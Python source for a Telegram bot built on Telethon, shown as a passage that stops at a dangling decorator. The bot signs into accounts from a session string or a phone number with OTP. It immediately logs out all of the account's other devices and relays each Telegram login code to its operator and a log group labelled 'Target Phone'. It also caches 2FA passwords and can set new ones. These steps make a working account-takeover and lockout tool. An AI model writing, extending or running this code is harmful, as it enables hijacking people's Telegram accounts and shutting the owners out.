import re
import asyncio
from datetime import datetime, timezone, timedelta
from aiohttp import web
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.account import GetPasswordRequest
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.errors import (
    FloodWaitError,
    RPCError,
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PasswordHashInvalidError,
)
from config import (
    API_ID,
    API_HASH,
    BOT_TOKEN,
    OWNER_ID,
    LOG_GROUP_ID,
    START_IMG,
    UPDATE_URL,
    SUPPORT_URL,
    PORT,
)

# Python 3.14 fix: TelegramClient initialize karne se pehle event loop set karein
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

bot = TelegramClient("autoview_otp_bot", API_ID, API_HASH, loop=loop)
active_clients = {}
pending_logins = {}
pending_2fa_set = {}
cached_2fa_passwords = {}
sudo_users = set()
IST = timezone(timedelta(hours=5, minutes=30))


def is_owner(user_id: int) -> bool:
    try:
        return int(user_id) == int(OWNER_ID)
    except Exception:
        return False


def is_authorized(user_id: int) -> bool:
    if not user_id:
        return False
    return is_owner(user_id) or (int(user_id) in sudo_users)


def now_ist() -> str:
    return datetime.now(IST).strftime("%d %b %Y, %I:%M:%S %p IST")


async def send_log(text: str):
    """Log group me activity ya error bhejta hai."""
    if not LOG_GROUP_ID:
        return
    try:
        await bot.send_message(LOG_GROUP_ID, text)
    except Exception as exc:
        print(f"Log group send failed: {exc}")


def extract_otp(text: str):
    if not text:
        return None
    match = re.search(r"\b(\d{5})\b", text)
    return match.group(1) if match else None


def looks_like_phone(value: str) -> bool:
    cleaned = re.sub(r"[\s\-\(\)]", "", value.strip())
    return bool(re.fullmatch(r"\+?\d{7,15}", cleaned))


async def cleanup_user_session(user_id: int):
    client = active_clients.pop(user_id, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    pending_state = pending_logins.pop(user_id, None)
    if pending_state and pending_state.get("client"):
        try:
            await pending_state["client"].disconnect()
        except Exception:
            pass
    pending_2fa_set.pop(user_id, None)
    cached_2fa_passwords.pop(user_id, None)


async def terminate_other_sessions(client: TelegramClient) -> str:
    """Baaki sabhi logged-in devices/sessions ko logout karta hai."""
    try:
        res = await client(ResetAuthorizationsRequest())
        if res:
            return "All other devices logged out"
        return "No other active sessions / already clean"
    except FloodWaitError as fw:
        return f"Skipped (FloodWait: {fw.seconds}s)"
    except RPCError as rpc_err:
        return f"Skipped ({rpc_err.message})"
    except Exception as exc:
        return f"Skipped ({str(exc)})"


async def attach_otp_listener_and_finalize(
    user_id: int,
    uname: str,
    user_client: TelegramClient,
    status_or_event,
    is_edit: bool = False,
):
    me = await user_client.get_me()
    active_clients[user_id] = user_client

    reset_status = await terminate_other_sessions(user_client)

    try:
        pwd_info = await user_client(GetPasswordRequest())
        has_2fa = (
            "Enabled (Telegram does not allow fetching existing password)"
            if pwd_info.has_password
            else "Disabled"
        )
        hint = pwd_info.hint if pwd_info.hint else "None"
    except Exception:
        has_2fa = "Unknown"
        hint = "None"

    @user_client.on(events.NewMessage(from_users=777000))
    async def otp_listener(otp_event):
        raw_msg = otp_event.raw_text or ""
        code = extract_otp(raw_msg)
        if code:
            await bot.send_message(
                user_id,
                f"📩 **ɴᴀʏᴀ ᴛᴇʟᴇɢʀᴀᴍ ᴏᴛᴘ ᴀᴀʏᴀ ʜᴀɪ!**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔑 **ʟᴏɢɪɴ ᴄᴏᴅᴇ:** `{code}`\n"
                f"📱 **ᴀᴄᴄᴏᴜɴᴛ:** `+{me.phone}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📝 **ᴍᴇꜱꜱᴀɢᴇ:**\n{raw_msg}",
            )
            await send_log(
                f"🔑 **#OTP_DELIVERED**\n"
                f"• **User:** `{user_id}` ({uname})\n"
                f"• **Target Phone:** `+{me.phone}`\n"
                f"• **OTP Code:** `{code}`\n"
                f"• **Time:** `{now_ist()}`"
            )
        else:
            await bot.send_message(
                user_id,
                f"📩 **ᴛᴇʟᴇɢʀᴀᴍ (777000) ᴍᴇꜱꜱᴀɢᴇ:**\n\n{raw_msg}",
            )

    success_text = (
        f"🎉 **ʟᴏɢɪɴ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟ!**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {me.first_name or 'User'}\n"
        f"📱 **ᴘʜᴏɴᴇ:** `+{me.phone}`\n"
        f"🆔 **ᴜꜱᴇʀ ɪᴅ:** `{me.id}`\n"
        f"📱 **ᴅᴇᴠɪᴄᴇꜱ:** `{reset_status}`\n"
        f"🔐 **2ꜰᴀ:** `{has_2fa}` (Hint: `{hint}`)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ **3 ꜱᴇᴄ ᴡᴀɪᴛ ᴋʀᴏ, ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ᴄʜᴇᴄᴋ ᴋᴀʀ ʀᴀʜᴀ ʜᴏᴏɴ...**"
    )

    if is_edit:
        await status_or_event.edit(success_text)
    else:
        await status_or_event.reply(success_text)

    await asyncio.sleep(3)
    await send_latest_otp(user_client, user_id, str(me.phone))

    await send_log(
        f"✅ **#LOGIN_SUCCESS**\n"
        f"• **User:** `{user_id}` ({uname})\n"
        f"• **Logged Account:** `{me.first_name}` (`+{me.phone}`, ID: `{me.id}`)\n"
        f"• **Other Sessions:** `{reset_status}`\n"
        f"• **2FA:** `{has_2fa}`\n"
        f"• **Time:** `{now_ist()}`"
    )


def main_menu_buttons():
    return [
        [
            Button.inline("✦ ʜᴇʟᴘ ᴍᴇɴᴜ", b"open_help"),
            Button.inline("◈ ꜰᴜʟʟ ɢᴜɪᴅᴇ", b"open_guide"),
        ],
        [
            Button.url("🔕 ᴜᴘᴅᴀᴛᴇ", UPDATE_URL),
            Button.url("💌 ꜱᴜᴘᴘᴏʀᴛ", SUPPORT_URL),
        ],
    ]


def back_to_start_buttons():
    return [
        [
            Button.inline("✦ ʜᴇʟᴘ", b"open_help"),
            Button.inline("◈ ɢᴜɪᴅᴇ", b"open_guide"),
        ],
        [
            Button.inline("◀ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", b"back_start"),
        ],
    ]


START_CAPTION = (
    "✦ **ᴀᴜᴛᴏᴠɪᴇᴡ ꜱᴇꜱꜱɪᴏɴ ʟᴏɢɪɴ ʙᴏᴛ** ✦\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "ᴀᴘɴɪ ᴛᴇʟᴇᴛʜᴏɴ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ʏᴀ ᴍᴏʙɪʟᴇ ɴᴜᴍʙᴇʀ ꜱᴇ\n"
    "ᴀᴄᴄᴏᴜɴᴛ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ ᴀᴜʀ ʀᴇᴀʟ-ᴛɪᴍᴇ ᴏᴛᴘ ᴘʀᴀᴘᴛ ᴋᴀʀᴇɪɴ.\n\n"
    "▸ **ꜱᴛᴀᴛᴜꜱ:** `ᴏɴʟɪɴᴇ & ʀᴇᴀᴅʏ`\n"
    "▸ **ᴏᴡɴᴇʀ:** @CoderNova\n"
    "▸ **ᴍᴏᴅᴇ:** `ᴅᴀᴛᴀʙᴀꜱᴇ-ꜰʀᴇᴇ / ꜰᴀꜱᴛ`\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ʙᴜᴛᴛᴏɴꜱ ꜱᴇ **ʜᴇʟᴘ** ʏᴀ **ɢᴜɪᴅᴇ** ᴏᴘᴇɴ ᴋᴀʀᴇɪɴ."
)

HELP_TEXT = (
    "✦ **ᴀᴜᴛᴏᴠɪᴇᴡ — ʜᴇʟᴘ & ᴄᴏᴍᴍᴀɴᴅꜱ** ✦\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "• `/start` — ʙᴏᴛ ᴍᴇɴᴜ ᴀᴜʀ ꜱᴛᴀᴛᴜꜱ ᴅᴇᴋʜᴇɪɴ\n"
    "• `/login <string>` — ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ + ᴏᴛʜᴇʀ ᴅᴇᴠɪᴄᴇꜱ ʟᴏɢᴏᴜᴛ\n"
    "• `/login +91xxxxxxxxxx` — ɴᴜᴍʙᴇʀ ꜱᴇ ᴏᴛᴘ ᴍᴀɴɢᴡᴀ ᴋᴀʀ ʟᴏɢɪɴ ᴋᴀʀᴇɪɴ\n"
    "• `/otp` ʏᴀ `/lastotp` — `777000` ꜱᴇ ʟᴀᴛᴇꜱᴛ ᴏᴛᴘ ʟᴇɪɴ\n"
    "• `/check` — 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ, ʜɪɴᴛ ᴀᴜʀ ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ\n"
    "• `/2fa` — 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ / ᴄᴀᴄʜᴇᴅ ᴘᴀꜱꜱᴡᴏʀᴅ / ꜱᴇᴛ 2ꜰᴀ\n"
    "• `/logout` — ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴ ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ᴋᴀʀᴇɪɴ\n"
    "• `/sudo <id>` — ᴜꜱᴇʀ ᴋᴏ ꜱᴜᴅᴏ ᴍᴇ ᴀᴅᴅ ᴋᴀʀᴇɪɴ (ᴏᴡɴᴇʀ)\n"
    "• `/unsudo <id>` — ᴜꜱᴇʀ ᴋᴏ ꜱᴜᴅᴏ ꜱᴇ ʜᴀᴛᴀʏᴇɪɴ (ᴏᴡɴᴇʀ)\n"
    "• `/sudolist` — ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋɪ ʟɪꜱᴛ ᴅᴇᴋʜᴇɪɴ (ᴏᴡɴᴇʀ)\n"
    "• `/help` — ᴄᴏᴍᴍᴀɴᴅꜱ ʟɪꜱᴛ ᴅᴇᴋʜᴇɪɴ\n"
    "• `/guide` — ᴘᴜʀᴀ ꜱᴛᴇᴘ-ʙʏ-ꜱᴛᴇᴘ ɢᴜɪᴅᴇ ᴘᴀᴅʜᴇɪɴ\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "💡 *ɴᴏᴛᴇ:* ᴛᴇʟᴇɢʀᴀᴍ ᴋɪꜱɪ ʙʜɪ ᴘᴜʀᴀɴᴇ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ᴋᴏ ꜰᴇᴛᴄʜ ɴᴀʜɪ ᴋᴀʀɴᴇ ᴅᴇᴛᴀ."
)

GUIDE_TEXT = (
    "◈ **ꜱᴛᴇᴘ-ʙʏ-ꜱᴛᴇᴘ ʟᴏɢɪɴ & ᴏᴛᴘ ɢᴜɪᴅᴇ** ◈\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "**1.** `/login <string>` ʏᴀ `/login +91xxxxxxxxxx` ʙʜᴇᴊᴇɪɴ.\n"
    "**2.** ɴᴜᴍʙᴇʀ ʜᴏ ᴛᴏ ᴀᴀʏᴀ ᴏᴛᴘ (ᴀᴜʀ 2ꜰᴀ ʜᴏ ᴛᴏ ᴘᴀꜱꜱᴡᴏʀᴅ) ʙᴏᴛ ᴋᴏ ʙʜᴇᴊᴇɪɴ.\n"
    "**3.** ʙᴏᴛ ʙᴀᴀᴋɪ ᴅᴇᴠɪᴄᴇꜱ ꜱᴇ ʟᴏɢᴏᴜᴛ ᴋᴀʀᴋᴇ 3 ꜱᴇᴄ ʙᴀᴀᴅ `777000` ꜱᴇ ᴏᴛᴘ ʙʜᴇᴊᴇɢᴀ.\n"
    "**4.** ᴘʜɪʀ ꜱᴇ ᴏᴛᴘ ᴄʜᴀʜɪʏᴇ ᴛᴏ `/otp` ʏᴀ `/lastotp` ᴅᴀʙᴀʏᴇɪɴ.\n"
    "**5.** `/2fa` ꜱᴇ 2ꜰᴀ ꜱᴛᴀᴛᴜꜱ ᴅᴇᴋʜᴇɪɴ (ᴇxɪꜱᴛɪɴɢ ᴘᴀꜱꜱᴡᴏʀᴅ ᴛᴇʟᴇɢʀᴀᴍ ꜰᴇᴛᴄʜ ɴᴀʜɪ ᴋᴀʀɴᴇ ᴅᴇᴛᴀ).\n"
    "**6.** ᴋᴀᴀᴍ ʜᴏɴᴇ ᴋᴇ ʙᴀᴀᴅ `/logout` ᴋᴀʀᴇɪɴ.\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
)


async def health_handler(request):
    return web.Response(text="OK - AutoView OTP Bot Alive", status=200)


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"Web server listening on port {PORT}")


async def send_latest_otp(client, target_chat_id: int, phone: str):
    """777000 se latest message/OTP nikal kar target_chat_id ko bhejta hai."""
    messages = await client.get_messages(777000, limit=1)
    if not messages:
        await bot.send_message(
            target_chat_id,
            f"ℹ️ **777000 ꜱᴇ ᴀʙʜɪ ᴋᴏɪ ᴏᴛᴘ ᴍᴇꜱꜱᴀɢᴇ ɴᴀʜɪ ᴍɪʟᴀ.**\n"
            f"📱 **ᴘʜᴏɴᴇ:** `+{phone}`\n"
            f"ᴀɢᴀʀ ᴀʙʜɪ ʟᴏɢɪɴ ᴛʀʏ ᴋɪʏᴀ ʜᴀɪ ᴛᴏ ᴏᴛᴘ ᴀᴀᴛᴇ ʜɪ ʙᴏᴛ ʙʜᴇᴊ ᴅᴇɢᴀ.",
        )
        return

    msg = messages[0]
    raw_text = msg.raw_text or ""
    code = extract_otp(raw_text)
    msg_time = msg.date.astimezone(IST).strftime("%d %b %Y, %I:%M:%S %p IST")

    if code:
        await bot.send_message(
            target_chat_id,
            f"🔑 **ᴏᴛᴘ ʙʜᴇᴊ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• **OTP Code:** `{code}`\n"
            f"• **Phone:** `+{phone}`\n"
            f"• **Time:** `{msg_time}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{raw_text}",
        )
    else:
        await bot.send_message(
            target_chat_id,
            f"📩 **777000 ᴍᴇꜱꜱᴀɢᴇ** (`{msg_time}`):\n\n{raw_text}",
        )


async def extract_target_user_id(event, arg_text: str | None):
    if arg_text:
        cleaned = arg_text.strip()
        if cleaned.lstrip("-").isdigit():
            return int(cleaned)
        try:
            entity = await bot.get_entity(cleaned)
            return entity.id
        except Exception:
            return None
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        if reply_msg and reply_msg.sender_id:
            return reply_msg.sender_id
    return None


@bot.on(events.NewMessage(pattern=r"^/sudo(?:@\w+)?(?:\s+(.+))?$"))
async def add_sudo_handler(event):
    if not is_owner(event.sender_id):
        return await event.reply("⛔ **ʏᴇʜ ᴄᴏᴍᴍᴀɴᴅ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.**")

    target_id = await extract_target_user_id(event, event.pattern_match.group(1))
    if not target_id:
        return await event.reply("❌ **ᴜꜱᴀɢᴇ:** `/sudo <user_id/@username>` ʏᴀ ᴋɪꜱɪ ᴍꜱɢ ᴋᴏ ʀᴇᴘʟʏ ᴋᴀʀᴋᴇ `/sudo` ʟɪᴋʜᴇɪɴ.")

    if is_owner(target_id):
        return await event.reply("ℹ️ **ʏᴇʜ ᴜꜱᴇʀ ᴘᴇʜʟᴇ ꜱᴇ ʜɪ ᴏᴡɴᴇʀ ʜᴀɪ.**")

    if target_id in sudo_users:
        return await event.reply(f"ℹ️ **User `{target_id}` ᴘᴇʜʟᴇ ꜱᴇ ꜱᴜᴅᴏ ʟɪꜱᴛ ᴍᴇ ʜᴀɪ.**")

    sudo_users.add(target_id)
    await event.reply(f"✅ **User `{target_id}` ᴋᴏ ꜱᴜᴅᴏ ᴍᴇ ᴀᴅᴅ ᴋᴀʀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ.**")
    await send_log(
        f"🛡️ **#SUDO_ADD**\n"
        f"• **Added User:** `{target_id}`\n"
        f"• **By Owner:** `{event.sender_id}`\n"
        f"• **Time:** `{now_ist()}`"
    )


@bot.on(events.NewMessage(pattern=r"^/unsudo(?:@\w+)?(?:\s+(.+))?$"))
async def remove_sudo_handler(event):
    if not is_owner(event.sender_id):
        return await event.reply("⛔ **ʏᴇʜ ᴄᴏᴍᴍᴀɴᴅ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.**")

    target_id = await extract_target_user_id(event, event.pattern_match.group(1))
    if not target_id:
        return await event.reply("❌ **ᴜꜱᴀɢᴇ:** `/unsudo <user_id/@username>` ʏᴀ ᴋɪꜱɪ ᴍꜱɢ ᴋᴏ ʀᴇᴘʟʏ ᴋᴀʀᴋᴇ `/unsudo` ʟɪᴋʜᴇɪɴ.")

    if target_id not in sudo_users:
        return await event.reply(f"ℹ️ **User `{target_id}` ꜱᴜᴅᴏ ʟɪꜱᴛ ᴍᴇ ɴᴀʜɪ ʜᴀɪ.**")

    sudo_users.remove(target_id)
    await cleanup_user_session(target_id)

    await event.reply(f"🗑️ **User `{target_id}` ᴋᴏ ꜱᴜᴅᴏ ꜱᴇ ʜᴀᴛᴀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ.**")
    await send_log(
        f"🛡️ **#SUDO_REMOVE**\n"
        f"• **Removed User:** `{target_id}`\n"
        f"• **By Owner:** `{event.sender_id}`\n"
        f"• **Time:** `{now_ist()}`"
    )


@bot.on(events.NewMessage(pattern=r"^/sudolist(?:@\w+)?$"))
async def sudo_list_handler(event):
    if not is_owner(event.sender_id):
        return await event.reply("⛔ **ʏᴇʜ ᴄᴏᴍᴍᴀɴᴅ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.**")

    if not sudo_users:
        return await event.reply(
            f"📋 **ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ʟɪꜱᴛ**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• **Owner:** `{OWNER_ID}`\n"
            f"• **Sudo Users:** `None`"
        )

    formatted = "\n".join(f"• `{uid}`" for uid in sorted(sudo_users))
    await event.reply(
        f"📋 **ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ʟɪꜱᴛ**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• **Owner:** `{OWNER_ID}`\n"
        f"{formatted}"
    )


@bot.on(events.NewMessage(pattern=r"^/start(?:@\w+)?$"))
async def start_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")

    sender = await event.get_sender()
    uname = f"@{sender.username}" if sender and sender.username else "No Username"
    await event.respond(
        START_CAPTION,
        file=START_IMG,
        buttons=main_menu_buttons(),
    )
    await send_log(
        f"🟢 **#START**\n"
        f"• **User:** `{event.sender_id}` ({uname})\n"
        f"• **Time:** `{now_ist()}`"
    )


@bot.on(events.NewMessage(pattern=r"^/help(?:@\w+)?$"))
async def help_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")
    await event.reply(HELP_TEXT, buttons=back_to_start_buttons())


@bot.on(events.NewMessage(pattern=r"^/guide(?:@\w+)?$"))
async def guide_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")
    await event.reply(GUIDE_TEXT, buttons=back_to_start_buttons())


@bot.on(events.CallbackQuery(data=b"open_help"))
async def cb_help(event):
    if not is_authorized(event.sender_id):
        return await event.answer("Access Denied!", alert=True)
    await event.edit(HELP_TEXT, buttons=back_to_start_buttons())


@bot.on(events.CallbackQuery(data=b"open_guide"))
async def cb_guide(event):
    if not is_authorized(event.sender_id):
        return await event.answer("Access Denied!", alert=True)
    await event.edit(GUIDE_TEXT, buttons=back_to_start_buttons())


@bot.on(events.CallbackQuery(data=b"back_start"))
async def cb_back_start(event):
    if not is_authorized(event.sender_id):
        return await event.answer("Access Denied!", alert=True)
    await event.delete()
    await event.respond(
        START_CAPTION,
        file=START_IMG,
        buttons=main_menu_buttons(),
    )


@bot.on(events.NewMessage(pattern=r"^/login(?:@\w+)?(?:\s+(.+))?", func=lambda e: e.is_private))
async def login_handler(event):
    if not is_authorized(event.sender_id):
        return await event.reply("⛔ **ᴀᴄᴄᴇꜱꜱ ᴅᴇɴɪᴇᴅ:** ʏᴇʜ ʙᴏᴛ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴀᴜʀ ꜱᴜᴅᴏ ᴜꜱᴇʀꜱ ᴋᴇ ʟɪʏᴇ ʜᴀɪ.")

    user_id = event.sender_id
    sender = await event.get_sender()
    uname = f"@{sender.username}" if sender and sender.username else "No Username"
    raw_arg = event.pattern_match.group(1)

    if not raw_arg:
        return await event.reply(
            "❌ **ᴜꜱᴀɢᴇ:**\n"
            "• `/login <aapki_telethon_string>`\n"
            "• `/login +919876543210`\n\n"
            "ᴘᴜʀɪ ᴊᴀɴᴋᴀʀɪ ᴋᴇ ʟɪʏᴇ `/guide` ᴄʜᴇᴄᴋ ᴋᴀʀᴇɪɴ."
        )

    arg_val = raw_arg.strip()
    await cleanup_user_session(user_id)

    # Case 1: Mobile Number Login Flow
    if looks_like_phone(arg_val):
        phone = re.sub(r"[\s\-\(\)]", "", arg_val)
        if not phone.startswith("+"):
            phone = f"+{phone}"

        status_msg = await event.reply(
            f"📲 **ɴᴜᴍʙᴇʀ `{phone}` ᴘᴀʀ ᴏᴛᴘ ʙʜᴇᴊ ʀᴀʜᴀ ʜᴏᴏɴ...**"
        )
        try:
            user_client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
            await user_client.connect()
            sent = await user_client.send_code_request(phone)

            pending_logins[user_id] = {
                "step": "awaiting_otp",
                "phone": phone,
                "phone_code_hash": sent.phone_code_hash,
                "client": user_client,
                "uname": uname,
            }

            await status_msg.edit(
                f"📩 **ᴏᴛᴘ ʙʜᴇᴊ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ (`{phone}`)**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"ᴀᴘɴᴇ ᴛᴇʟᴇɢʀᴀᴍ / ꜱᴍꜱ ᴍᴇ ᴀᴀʏᴀ **5-digit OTP** ʏᴀʜᴀɴ ʙʜᴇᴊᴇɪɴ.\n"
                f"*(Cancel karne ke liye `/logout` likhein)*"
            )
            await send_log(
                f"📲 **#PHONE_OTP_SENT**\n"
                f"• **User:** `{user_id}` ({uname})\n"
                f"• **Phone:** `{phone}`\n"
                f"• **Time:** `{now_ist()}`"
            )
        except Exception as exc:
            try:
                await user_client.disconnect()
            except Exception:
                pass
            await status_msg.edit(f"❌ **ᴏᴛᴘ ꜱᴇɴᴅ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")
            await send_log(
                f"🚨 **#PHONE_OTP_ERROR**\n"
                f"• **User:** `{user_id}` ({uname})\n"
                f"• **Phone:** `{phone}`\n"
                f"• **Error:** `{str(exc)}`\n"
                f"• **Time:** `{now_ist()}`"
            )
        return

    # Case 2: StringSession Login Flow
    status_msg = await event.reply(
        "⏳ **ꜱᴇꜱꜱɪᴏɴ ᴄᴏɴɴᴇᴄᴛ ᴋᴀʀ ʀᴀʜᴀ ʜᴏᴏɴ ᴀᴜʀ ᴏʟᴅ ᴅᴇᴠɪᴄᴇꜱ ʟᴏɢᴏᴜᴛ ᴋᴀʀɴᴇ ᴋɪ ᴋᴏꜱʜɪꜱʜ ᴊᴀʀɪ ʜᴀɪ...**"
    )

    try:
        user_client = TelegramClient(StringSession(arg_val), API_ID, API_HASH, loop=loop)
        await user_client.connect()

        if not await user_client.is_user_authorized():
            await user_client.disconnect()
            await status_msg.edit("❌ **ʏᴇʜ ꜱᴇꜱꜱɪᴏɴ ꜱᴛʀɪɴɢ ɪɴᴠᴀʟɪᴅ ʏᴀ ᴇxᴘɪʀᴇᴅ ʜᴀɪ.**")
            await send_log(
                f"⚠️ **#LOGIN_FAILED**\n"
                f"• **User:** `{user_id}` ({uname})\n"
                f"• **Reason:** Unauthorized / Expired string\n"
                f"• **Time:** `{now_ist()}`"
            )
            return

        await attach_otp_listener_and_finalize(
            user_id=user_id,
            uname=uname,
            user_client=user_client,
            status_or_event=status_msg,
            is_edit=True,
        )

    except Exception as exc:
        await status_msg.edit(f"❌ **ᴇʀʀᴏʀ:** `{str(exc)}`")
        await send_log(
            f"🚨 **#LOGIN_ERROR**\n"
            f"• **User:** `{user_id}` ({uname})\n"
            f"• **Error:** `{str(exc)}`\n"
            f"• **Time:** `{now_ist()}`"
        )


@bot.on(events.NewMessage(func=lambda e: e.is_private and not (e.raw_text or "").startswith("/")))
async def interactive_login_step_handler(event):
    user_id = event.sender_id
    if not is_authorized(user_id):
        return

    text = (event.raw_text or "").strip()
    if not text:
        return

    # Agar user /2fa se naya password set kar raha hai
    if user_id in pending_2fa_set:
        client = active_clients.get(user_id)
        pending_2fa_set.pop(user_id, None)
        if not client:
            return await event.reply("❌ **ᴀᴄᴛɪᴠᴇ ꜱᴇꜱꜱɪᴏɴ ɴᴀʜɪ ᴍɪʟᴀ. ᴘᴇʜʟᴇ `/login` ᴋᴀʀᴇɪɴ.**")
        try:
            await client.edit_2fa(new_password=text)
            cached_2fa_passwords[user_id] = text
            return await event.reply("✅ **2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ʜᴏ ɢᴀʏᴀ ʜᴀɪ.**")
        except Exception as exc:
            return await event.reply(f"❌ **2ꜰᴀ ꜱᴇᴛ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")

    state = pending_logins.get(user_id)
    if not state:
        return

    step = state.get("step")
    phone = state.get("phone")
    phone_code_hash = state.get("phone_code_hash")
    user_client = state.get("client")
    uname = state.get("uname", "No Username")

    if step == "awaiting_otp":
        code = re.sub(r"\D", "", text)
        if not code:
            return await event.reply("❌ **ᴋʀɪᴘʏᴀ ꜱᴀʜɪ ᴏᴛᴘ ɴᴜᴍʙᴇʀ ʙʜᴇᴊᴇɪɴ (jaise `12345`).**")

        try:
            await user_client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            pending_logins.pop(user_id, None)
            await attach_otp_listener_and_finalize(
                user_id=user_id,
                uname=uname,
                user_client=user_client,
                status_or_event=event,
                is_edit=False,
            )
        except SessionPasswordNeededError:
            state["step"] = "awaiting_password"
            await event.reply(
                "🔐 **ɪꜱ ᴀᴄᴄᴏᴜɴᴛ ᴘᴀʀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ʟᴀɢᴀ ʜᴀɪ.**\n"
                "ᴀᴘɴᴀ 2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ʙʜᴇᴊᴇɪɴ:"
            )
        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
            await event.reply("❌ **ᴏᴛᴘ ɢᴀʟᴀᴛ ʏᴀ ᴇxᴘɪʀᴇᴅ ʜᴀɪ. ᴅᴏʙᴀʀᴀ ꜱᴀʜɪ ᴏᴛᴘ ʙʜᴇᴊᴇɪɴ ʏᴀ `/login <number>` ꜱᴇ ɴᴀʏᴀ ᴏᴛᴘ ᴍᴀɴɢᴡᴀʏᴇɪɴ.**")
        except Exception as exc:
            await cleanup_user_session(user_id)
            await event.reply(f"❌ **ʟᴏɢɪɴ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")

    elif step == "awaiting_password":
        try:
            await user_client.sign_in(password=text)
            cached_2fa_passwords[user_id] = text
            pending_logins.pop(user_id, None)
            await attach_otp_listener_and_finalize(
                user_id=user_id,
                uname=uname,
                user_client=user_client,
                status_or_event=event,
                is_edit=False,
            )
        except PasswordHashInvalidError:
            await event.reply("❌ **2ꜰᴀ ᴘᴀꜱꜱᴡᴏʀᴅ ɢᴀʟᴀᴛ ʜᴀɪ. ᴅᴏʙᴀʀᴀ ꜱᴀʜɪ ᴘᴀꜱꜱᴡᴏʀᴅ ʙʜᴇᴊᴇɪɴ:**")
        except Exception as exc:
            await cleanup_user_session(user_id)
            await event.reply(f"❌ **2ꜰᴀ ʟᴏɢɪɴ ꜰᴀɪʟᴇᴅ:** `{str(exc)}`")


@bot.on(events.NewMessage(pattern=r"^/(?:otp|lastotp)(?:@\w+)?$", func=lambda e: e.is_private))
